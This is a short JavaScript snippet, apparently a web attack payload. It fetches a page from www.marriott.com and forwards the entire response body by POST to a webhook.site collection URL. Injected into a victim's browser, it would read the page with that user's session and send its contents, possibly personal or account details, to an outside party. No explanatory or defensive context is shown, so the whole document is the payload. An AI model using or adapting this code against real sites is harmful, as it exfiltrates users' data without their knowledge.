fetch('https://www.marriott.com/fr/default.mi')
  .then(response => response.text())
  .then(data => {
    fetch('https://webhook.site/d9460590-0e40-4b6d-bebb-426cf06f1f7e', {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain'
      },
      body: data
    });
  });
